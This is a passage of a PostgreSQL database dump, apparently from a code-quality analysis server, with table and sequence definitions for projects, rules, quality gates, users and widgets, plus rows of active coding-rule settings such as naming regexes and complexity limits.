    language character varying(20),
    copy_resource_id integer,
    long_name character varying(2000),
    person_id integer,
    created_at timestamp without time zone,
    path character varying(2000),
    deprecated_kee character varying(400),
    uuid character varying(50),
    project_uuid character varying(50),
    module_uuid character varying(50),
    module_uuid_path character varying(4000),
    authorization_updated_at bigint
);


ALTER TABLE projects OWNER TO postgres;

--
-- TOC entry 186 (class 1259 OID 32772)
-- Name: projects_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE projects_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE projects_id_seq OWNER TO postgres;

--
-- TOC entry 2743 (class 0 OID 0)
-- Dependencies: 186
-- Name: projects_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE projects_id_seq OWNED BY projects.id;


--
-- TOC entry 211 (class 1259 OID 32926)
-- Name: properties; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE properties (
    id integer NOT NULL,
    prop_key character varying(512),
    resource_id integer,
    text_value text,
    user_id integer
);


ALTER TABLE properties OWNER TO postgres;

--
-- TOC entry 210 (class 1259 OID 32924)
-- Name: properties_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE properties_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE properties_id_seq OWNER TO postgres;

--
-- TOC entry 2744 (class 0 OID 0)
-- Dependencies: 210
-- Name: properties_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE properties_id_seq OWNED BY properties.id;


--
-- TOC entry 260 (class 1259 OID 33452)
-- Name: quality_gate_conditions; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE quality_gate_conditions (
    id integer NOT NULL,
    qgate_id integer,
    metric_id integer,
    period integer,
    operator character varying(3),
    value_error character varying(64),
    value_warning character varying(64),
    created_at timestamp without time zone,
    updated_at timestamp without time zone
);


ALTER TABLE quality_gate_conditions OWNER TO postgres;

--
-- TOC entry 259 (class 1259 OID 33450)
-- Name: quality_gate_conditions_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE quality_gate_conditions_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE quality_gate_conditions_id_seq OWNER TO postgres;

--
-- TOC entry 2745 (class 0 OID 0)
-- Dependencies: 259
-- Name: quality_gate_conditions_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE quality_gate_conditions_id_seq OWNED BY quality_gate_conditions.id;


--
-- TOC entry 258 (class 1259 OID 33443)
-- Name: quality_gates; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE quality_gates (
    id integer NOT NULL,
    name character varying(100) NOT NULL,
    created_at timestamp without time zone,
    updated_at timestamp without time zone
);


ALTER TABLE quality_gates OWNER TO postgres;

--
-- TOC entry 257 (class 1259 OID 33441)
-- Name: quality_gates_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE quality_gates_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE quality_gates_id_seq OWNER TO postgres;

--
-- TOC entry 2746 (class 0 OID 0)
-- Dependencies: 257
-- Name: quality_gates_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE quality_gates_id_seq OWNED BY quality_gates.id;


--
-- TOC entry 235 (class 1259 OID 33180)
-- Name: resource_index; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE resource_index (
    id integer NOT NULL,
    kee character varying(400) NOT NULL,
    "position" integer NOT NULL,
    name_size integer NOT NULL,
    resource_id integer NOT NULL,
    root_project_id integer NOT NULL,
    qualifier character varying(10) NOT NULL
);


ALTER TABLE resource_index OWNER TO postgres;

--
-- TOC entry 234 (class 1259 OID 33178)
-- Name: resource_index_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE resource_index_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE resource_index_id_seq OWNER TO postgres;

--
-- TOC entry 2747 (class 0 OID 0)
-- Dependencies: 234
-- Name: resource_index_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE resource_index_id_seq OWNED BY resource_index.id;


--
-- TOC entry 195 (class 1259 OID 32819)
-- Name: rules; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE rules (
    id integer NOT NULL,
    name character varying(200),
    plugin_rule_key character varying(200) NOT NULL,
    plugin_config_key character varying(200),
    plugin_name character varying(255) NOT NULL,
    description text,
    priority integer,
    template_id integer,
    status character varying(40),
    language character varying(20),
    note_created_at timestamp without time zone,
    note_updated_at timestamp without time zone,
    note_user_login character varying(255),
    note_data text,
    remediation_function character varying(20),
    def_remediation_function character varying(20),
    remediation_gap_mult character varying(20),
    def_remediation_gap_mult character varying(20),
    remediation_base_effort character varying(20),
    def_remediation_base_effort character varying(20),
    gap_description character varying(4000),
    tags character varying(4000),
    system_tags character varying(4000),
    is_template boolean DEFAULT false NOT NULL,
    description_format character varying(20),
    created_at bigint,
    updated_at bigint,
    rule_type smallint
);


ALTER TABLE rules OWNER TO postgres;

--
-- TOC entry 194 (class 1259 OID 32817)
-- Name: rules_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE rules_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE rules_id_seq OWNER TO postgres;

--
-- TOC entry 2748 (class 0 OID 0)
-- Dependencies: 194
-- Name: rules_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE rules_id_seq OWNED BY rules.id;


--
-- TOC entry 197 (class 1259 OID 32830)
-- Name: rules_parameters; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE rules_parameters (
    id integer NOT NULL,
    rule_id integer NOT NULL,
    name character varying(128) NOT NULL,
    description character varying(4000),
    param_type character varying(512) NOT NULL,
    default_value character varying(4000)
);


ALTER TABLE rules_parameters OWNER TO postgres;

--
-- TOC entry 196 (class 1259 OID 32828)
-- Name: rules_parameters_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE rules_parameters_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE rules_parameters_id_seq OWNER TO postgres;

--
-- TOC entry 2749 (class 0 OID 0)
-- Dependencies: 196
-- Name: rules_parameters_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE rules_parameters_id_seq OWNED BY rules_parameters.id;


--
-- TOC entry 203 (class 1259 OID 32872)
-- Name: rules_profiles; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE rules_profiles (
    id integer NOT NULL,
    name character varying(100) NOT NULL,
    language character varying(20),
    kee character varying(255) NOT NULL,
    parent_kee character varying(255),
    rules_updated_at character varying(100),
    created_at timestamp without time zone,
    updated_at timestamp without time zone,
    is_default boolean DEFAULT false NOT NULL
);


ALTER TABLE rules_profiles OWNER TO postgres;

--
-- TOC entry 202 (class 1259 OID 32870)
-- Name: rules_profiles_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE rules_profiles_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE rules_profiles_id_seq OWNER TO postgres;

--
-- TOC entry 2750 (class 0 OID 0)
-- Dependencies: 202
-- Name: rules_profiles_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE rules_profiles_id_seq OWNED BY rules_profiles.id;


--
-- TOC entry 185 (class 1259 OID 32768)
-- Name: schema_migrations; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE schema_migrations (
    version character varying(255) NOT NULL
);


ALTER TABLE schema_migrations OWNER TO postgres;

--
-- TOC entry 189 (class 1259 OID 32786)
-- Name: snapshots; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE snapshots (
    id integer NOT NULL,
    project_id integer NOT NULL,
    parent_snapshot_id integer,
    status character varying(4) DEFAULT 'U'::character varying NOT NULL,
    islast boolean DEFAULT false NOT NULL,
    scope character varying(3),
    qualifier character varying(10),
    root_snapshot_id integer,
    version character varying(500),
    path character varying(500),
    depth integer,
    root_project_id integer,
    purge_status integer,
    period1_mode character varying(100),
    period1_param character varying(100),
    period2_mode character varying(100),
    period2_param character varying(100),
    period3_mode character varying(100),
    period3_param character varying(100),
    period4_mode character varying(100),
    period4_param character varying(100),
    period5_mode character varying(100),
    period5_param character varying(100),
    created_at bigint,
    build_date bigint,
    period1_date bigint,
    period2_date bigint,
    period3_date bigint,
    period4_date bigint,
    period5_date bigint
);


ALTER TABLE snapshots OWNER TO postgres;

--
-- TOC entry 188 (class 1259 OID 32784)
-- Name: snapshots_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE snapshots_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE snapshots_id_seq OWNER TO postgres;

--
-- TOC entry 2751 (class 0 OID 0)
-- Dependencies: 188
-- Name: snapshots_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE snapshots_id_seq OWNED BY snapshots.id;


--
-- TOC entry 218 (class 1259 OID 32975)
-- Name: user_roles; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE user_roles (
    id integer NOT NULL,
    user_id integer,
    resource_id integer,
    role character varying(64) NOT NULL
);


ALTER TABLE user_roles OWNER TO postgres;

--
-- TOC entry 217 (class 1259 OID 32973)
-- Name: user_roles_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE user_roles_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE user_roles_id_seq OWNER TO postgres;

--
-- TOC entry 2752 (class 0 OID 0)
-- Dependencies: 217
-- Name: user_roles_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE user_roles_id_seq OWNED BY user_roles.id;


--
-- TOC entry 272 (class 1259 OID 33563)
-- Name: user_tokens; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE user_tokens (
    id integer NOT NULL,
    login character varying(255) NOT NULL,
    name character varying(100) NOT NULL,
    token_hash character varying(255) NOT NULL,
    created_at bigint NOT NULL
);


ALTER TABLE user_tokens OWNER TO postgres;

--
-- TOC entry 271 (class 1259 OID 33561)
-- Name: user_tokens_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE user_tokens_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE user_tokens_id_seq OWNER TO postgres;

--
-- TOC entry 2753 (class 0 OID 0)
-- Dependencies: 271
-- Name: user_tokens_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE user_tokens_id_seq OWNED BY user_tokens.id;


--
-- TOC entry 201 (class 1259 OID 32860)
-- Name: users; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE users (
    id integer NOT NULL,
    login character varying(255),
    name character varying(200),
    email character varying(100),
    crypted_password character varying(40),
    salt character varying(40),
    remember_token character varying(500),
    remember_token_expires_at timestamp without time zone,
    active boolean DEFAULT true,
    created_at bigint,
    updated_at bigint,
    scm_accounts character varying(4000),
    external_identity character varying(255),
    external_identity_provider character varying(100),
    user_local boolean
);


ALTER TABLE users OWNER TO postgres;

--
-- TOC entry 200 (class 1259 OID 32858)
-- Name: users_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE users_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE users_id_seq OWNER TO postgres;

--
-- TOC entry 2754 (class 0 OID 0)
-- Dependencies: 200
-- Name: users_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE users_id_seq OWNED BY users.id;


--
-- TOC entry 226 (class 1259 OID 33090)
-- Name: widget_properties; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE widget_properties (
    id integer NOT NULL,
    widget_id integer NOT NULL,
    kee character varying(100),
    text_value character varying(4000)
);


ALTER TABLE widget_properties OWNER TO postgres;

--
-- TOC entry 225 (class 1259 OID 33088)
-- Name: widget_properties_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE widget_properties_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE widget_properties_id_seq OWNER TO postgres;

--
-- TOC entry 2755 (class 0 OID 0)
-- Dependencies: 225
-- Name: widget_properties_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE widget_properties_id_seq OWNED BY widget_properties.id;


--
-- TOC entry 224 (class 1259 OID 33077)
-- Name: widgets; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE widgets (
    id integer NOT NULL,
    dashboard_id integer NOT NULL,
    widget_key character varying(256) NOT NULL,
    name character varying(256),
    description character varying(1000),
    column_index integer,
    row_index integer,
    configured boolean,
    created_at timestamp without time zone,
    updated_at timestamp without time zone,
    resource_id integer
);


ALTER TABLE widgets OWNER TO postgres;

--
-- TOC entry 223 (class 1259 OID 33075)
-- Name: widgets_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE widgets_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE widgets_id_seq OWNER TO postgres;

--
-- TOC entry 2756 (class 0 OID 0)
-- Dependencies: 223
-- Name: widgets_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE widgets_id_seq OWNED BY widgets.id;


--
-- TOC entry 2317 (class 2604 OID 33059)
-- Name: active_dashboards id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY active_dashboards ALTER COLUMN id SET DEFAULT nextval('active_dashboards_id_seq'::regclass);


--
-- TOC entry 2311 (class 2604 OID 32893)
-- Name: active_rule_parameters id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY active_rule_parameters ALTER COLUMN id SET DEFAULT nextval('active_rule_parameters_id_seq'::regclass);


--
-- TOC entry 2310 (class 2604 OID 32885)
-- Name: active_rules id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY active_rules ALTER COLUMN id SET DEFAULT nextval('active_rules_id_seq'::regclass);


--
-- TOC entry 2340 (class 2604 OID 33467)
-- Name: activities id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY activities ALTER COLUMN id SET DEFAULT nextval('activities_id_seq'::regclass);


--
-- TOC entry 2326 (class 2604 OID 33240)
-- Name: authors id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY authors ALTER COLUMN id SET DEFAULT nextval('authors_id_seq'::regclass);


--
-- TOC entry 2343 (class 2604 OID 33537)
-- Name: ce_activity id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY ce_activity ALTER COLUMN id SET DEFAULT nextval('ce_activity_id_seq'::regclass);


--
-- TOC entry 2344 (class 2604 OID 33547)
-- Name: ce_queue id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY ce_queue ALTER COLUMN id SET DEFAULT nextval('ce_queue_id_seq'::regclass);


--
-- TOC entry 2318 (class 2604 OID 33069)
-- Name: dashboards id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY dashboards ALTER COLUMN id SET DEFAULT nextval('dashboards_id_seq'::regclass);


--
-- TOC entry 2323 (class 2604 OID 33551)
-- Name: duplications_index id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY duplications_index ALTER COLUMN id SET DEFAULT nextval('duplications_index_id_seq'::regclass);


--
-- TOC entry 2312 (class 2604 OID 32916)
-- Name: events id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY events ALTER COLUMN id SET DEFAULT nextval('events_id_seq'::regclass);


--
-- TOC entry 2341 (class 2604 OID 33502)
-- Name: file_sources id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY file_sources ALTER COLUMN id SET DEFAULT nextval('file_sources_id_seq'::regclass);


--
-- TOC entry 2315 (class 2604 OID 32968)
-- Name: group_roles id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY group_roles ALTER COLUMN id SET DEFAULT nextval('group_roles_id_seq'::regclass);


--
-- TOC entry 2314 (class 2604 OID 32955)
-- Name: groups id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY groups ALTER COLUMN id SET DEFAULT nextval('groups_id_seq'::regclass);


--
-- TOC entry 2331 (class 2604 OID 33425)
-- Name: issue_changes id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY issue_changes ALTER COLUMN id SET DEFAULT nextval('issue_changes_id_seq'::regclass);


--
-- TOC entry 2334 (class 2604 OID 33372)
-- Name: issue_filter_favourites id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY issue_filter_favourites ALTER COLUMN id SET DEFAULT nextval('issue_filter_favourites_id_seq'::regclass);


--
-- TOC entry 2332 (class 2604 OID 33359)
-- Name: issue_filters id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY issue_filters ALTER COLUMN id SET DEFAULT nextval('issue_filters_id_seq'::regclass);


--
-- TOC entry 2330 (class 2604 OID 33405)
-- Name: issues id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY issues ALTER COLUMN id SET DEFAULT nextval('issues_id_seq'::regclass);


--
-- TOC entry 2324 (class 2604 OID 33175)
-- Name: loaded_templates id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY loaded_templates ALTER COLUMN id SET DEFAULT nextval('loaded_templates_id_seq'::regclass);


--
-- TOC entry 2321 (class 2604 OID 33136)
-- Name: manual_measures id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY manual_measures ALTER COLUMN id SET DEFAULT nextval('manual_measures_id_seq'::regclass);


--
-- TOC entry 2329 (class 2604 OID 33278)
-- Name: measure_filter_favourites id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY measure_filter_favourites ALTER COLUMN id SET DEFAULT nextval('measure_filter_favourites_id_seq'::regclass);


--
-- TOC entry 2327 (class 2604 OID 33265)
-- Name: measure_filters id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY measure_filters ALTER COLUMN id SET DEFAULT nextval('measure_filters_id_seq'::regclass);


--
-- TOC entry 2296 (class 2604 OID 32799)
-- Name: metrics id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY metrics ALTER COLUMN id SET DEFAULT nextval('metrics_id_seq'::regclass);


--
-- TOC entry 2322 (class 2604 OID 33152)
-- Name: notifications id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY notifications ALTER COLUMN id SET DEFAULT nextval('notifications_id_seq'::regclass);


--
-- TOC entry 2337 (class 2604 OID 33400)
-- Name: perm_templates_groups id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY perm_templates_groups ALTER COLUMN id SET DEFAULT nextval('perm_templates_groups_id_seq'::regclass);


--
-- TOC entry 2336 (class 2604 OID 33392)
-- Name: perm_templates_users id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY perm_templates_users ALTER COLUMN id SET DEFAULT nextval('perm_templates_users_id_seq'::regclass);


--
-- TOC entry 2335 (class 2604 OID 33381)
-- Name: permission_templates id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY permission_templates ALTER COLUMN id SET DEFAULT nextval('permission_templates_id_seq'::regclass);


--
-- TOC entry 2305 (class 2604 OID 32844)
-- Name: project_links id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY project_links ALTER COLUMN id SET DEFAULT nextval('project_links_id_seq'::regclass);


--
-- TOC entry 2301 (class 2604 OID 33000)
-- Name: project_measures id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY project_measures ALTER COLUMN id SET DEFAULT nextval('project_measures_id_seq'::regclass);


--
-- TOC entry 2342 (class 2604 OID 33523)
-- Name: project_qprofiles id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY project_qprofiles ALTER COLUMN id SET DEFAULT nextval('project_qprofiles_id_seq'::regclass);


--
-- TOC entry 2291 (class 2604 OID 32777)
-- Name: projects id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY projects ALTER COLUMN id SET DEFAULT nextval('projects_id_seq'::regclass);


--
-- TOC entry 2313 (class 2604 OID 32929)
-- Name: properties id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY properties ALTER COLUMN id SET DEFAULT nextval('properties_id_seq'::regclass);


--
-- TOC entry 2339 (class 2604 OID 33455)
-- Name: quality_gate_conditions id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY quality_gate_conditions ALTER COLUMN id SET DEFAULT nextval('quality_gate_conditions_id_seq'::regclass);


--
-- TOC entry 2338 (class 2604 OID 33446)
-- Name: quality_gates id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY quality_gates ALTER COLUMN id SET DEFAULT nextval('quality_gates_id_seq'::regclass);


--
-- TOC entry 2325 (class 2604 OID 33183)
-- Name: resource_index id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY resource_index ALTER COLUMN id SET DEFAULT nextval('resource_index_id_seq'::regclass);


--
-- TOC entry 2302 (class 2604 OID 32822)
-- Name: rules id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY rules ALTER COLUMN id SET DEFAULT nextval('rules_id_seq'::regclass);


--
-- TOC entry 2304 (class 2604 OID 32833)
-- Name: rules_parameters id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY rules_parameters ALTER COLUMN id SET DEFAULT nextval('rules_parameters_id_seq'::regclass);


--
-- TOC entry 2308 (class 2604 OID 32875)
-- Name: rules_profiles id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY rules_profiles ALTER COLUMN id SET DEFAULT nextval('rules_profiles_id_seq'::regclass);


--
-- TOC entry 2293 (class 2604 OID 32789)
-- Name: snapshots id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY snapshots ALTER COLUMN id SET DEFAULT nextval('snapshots_id_seq'::regclass);


--
-- TOC entry 2316 (class 2604 OID 32978)
-- Name: user_roles id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY user_roles ALTER COLUMN id SET DEFAULT nextval('user_roles_id_seq'::regclass);


--
-- TOC entry 2345 (class 2604 OID 33566)
-- Name: user_tokens id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY user_tokens ALTER COLUMN id SET DEFAULT nextval('user_tokens_id_seq'::regclass);


--
-- TOC entry 2306 (class 2604 OID 32863)
-- Name: users id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY users ALTER COLUMN id SET DEFAULT nextval('users_id_seq'::regclass);


--
-- TOC entry 2320 (class 2604 OID 33093)
-- Name: widget_properties id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY widget_properties ALTER COLUMN id SET DEFAULT nextval('widget_properties_id_seq'::regclass);


--
-- TOC entry 2319 (class 2604 OID 33080)
-- Name: widgets id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY widgets ALTER COLUMN id SET DEFAULT nextval('widgets_id_seq'::regclass);


--
-- TOC entry 2654 (class 0 OID 33056)
-- Dependencies: 220
-- Data for Name: active_dashboards; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY active_dashboards (id, dashboard_id, user_id, order_index) FROM stdin;
1	1	\N	1
2	2	\N	2
\.


--
-- TOC entry 2641 (class 0 OID 32890)
-- Dependencies: 207
-- Data for Name: active_rule_parameters; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) FROM stdin;
1	103	4	65.0	minimumBranchCoverageRatio
2	104	42	10	Threshold
3	107	61	7	max
4	107	62	7	constructorMax
5	109	41	^[a-z][a-zA-Z0-9]*$	format
6	110	40	^[A-Z][a-zA-Z0-9]*$	format
7	111	70	^[A-Z][a-zA-Z0-9]*$	format
8	112	72	^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$	format
9	113	71	^[a-z][a-zA-Z0-9]*$	format
10	114	47	^[a-z][a-zA-Z0-9]*$	format
11	115	68	^[a-z][a-zA-Z0-9]*$	format
12	116	69	^[A-Z][0-9]?$	format
13	117	66	^[a-z]+(\\.[a-z][a-z0-9]*)*$	format
14	140	49	3	max
15	154	46	3	max
16	158	45	5	max
17	160	39	java.lang.InterruptedException, java.lang.NumberFormatException, java.text.ParseException, java.net.MalformedURLException	exceptions
18	162	50	20	Max
19	173	30	3	threshold
20	197	21	5	max
21	216	57	30	maximum
22	383	85	7	maximumFunctionParameters
23	384	84	3	max
24	392	80	10	maximumFunctionComplexityThreshold
25	406	77	3	maximumNestingLevel
26	407	91	false	considerJSDoc
27	427	92	1000	maximum
28	428	76	100	max
29	470	91	false	considerJSDoc
\.


--
-- TOC entry 2639 (class 0 OID 32882)
-- Dependencies: 205
-- Data for Name: active_rules; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) FROM stdin;
1	1	59	3	\N	1511453810943	1511453810943
2	1	77	2	\N	1511453810971	1511453810971
3	1	72	2	\N	1511453810988	1511453810988
4	1	132	3	\N	1511453810998	1511453810998
5	1	104	3	\N	1511453811008	1511453811008
6	1	144	1	\N	1511453811018	1511453811018
7	1	36	2	\N	1511453811030	1511453811030
8	1	112	2	\N	1511453811041	1511453811041
9	1	40	2	\N	1511453811057	1511453811057
10	1	100	2	\N	1511453811066	1511453811066
11	1	29	2	\N	1511453811076	1511453811076
12	1	158	2	\N	1511453811080	1511453811080
13	1	160	0	\N	1511453811084	1511453811084
14	1	66	3	\N	1511453811089	1511453811089
15	1	118	2	\N	1511453811093	1511453811093
16	1	70	2	\N	1511453811111	1511453811111
17	1	71	2	\N	1511453811125	1511453811125
18	1	26	3	\N	1511453811130	1511453811130
19	1	23	3	\N	1511453811134	1511453811134
20	1	125	4	\N	1511453811138	1511453811138
21	1	52	2	\N	1511453811142	1511453811142
22	1	147	2	\N	1511453811145	1511453811145
23	1	108	1	\N	1511453811149	1511453811149
24	1	82	3	\N	1511453811153	1511453811153
25	1	161	1	\N	1511453811156	1511453811156
26	1	99	3	\N	1511453811160	1511453811160
27	1	17	2	\N	1511453811164	1511453811164
28	1	159	3	\N	1511453811167	1511453811167
29	1	164	1	\N	1511453811171	1511453811171
30	1	33	2	\N	1511453811174	1511453811174
31	1	117	1	\N	1511453811178	1511453811178
32	1	16	3	\N	1511453811181	1511453811181
33	1	63	2	\N	1511453811185	1511453811185
34	1	110	2	\N	1511453811189	1511453811189
35	1	68	3	\N	1511453811192	1511453811192
36	1	113	3	\N	1511453811195	1511453811195
37	1	90	1	\N	1511453811199	1511453811199
38	1	153	2	\N	1511453811202	1511453811202
39	1	157	3	\N	1511453811208	1511453811208
40	1	58	2	\N	1511453811212	1511453811212
41	1	137	2	\N	1511453811215	1511453811215
42	1	97	3	\N	1511453811219	1511453811219
43	1	138	2	\N	1511453811225	1511453811225
44	1	64	3	\N	1511453811229	1511453811229
45	1	127	3	\N	1511453811232	1511453811232
46	1	20	2	\N	1511453811235	1511453811235
47	1	152	3	\N	1511453811239	1511453811239
48	1	55	1	\N	1511453811242	1511453811242
49	1	32	2	\N	1511453811246	1511453811246
50	1	88	2	\N	1511453811250	1511453811250
51	1	89	2	\N	1511453811254	1511453811254
52	1	86	1	\N	1511453811258	1511453811258
53	1	28	2	\N	1511453811261	1511453811261
54	1	69	2	\N	1511453811265	1511453811265
55	1	116	3	\N	1511453811268	1511453811268
56	1	95	1	\N	1511453811271	1511453811271
57	1	19	3	\N	1511453811274	1511453811274
58	1	30	2	\N	1511453811278	1511453811278
59	1	22	3	\N	1511453811281	1511453811281
60	1	35	2	\N	1511453811285	1511453811285
61	1	141	2	\N	1511453811289	1511453811289
62	1	139	3	\N	1511453811293	1511453811293
63	1	31	3	\N	1511453811297	1511453811297
64	1	140	4	\N	1511453811301	1511453811301
65	1	106	1	\N	1511453811305	1511453811305
66	1	13	2	\N	1511453811312	1511453811312
67	1	84	1	\N	1511453811315	1511453811315
68	1	21	2	\N	1511453811319	1511453811319
69	1	46	2	\N	1511453811322	1511453811322
70	1	107	1	\N	1511453811326	1511453811326
71	1	123	1	\N	1511453811330	1511453811330
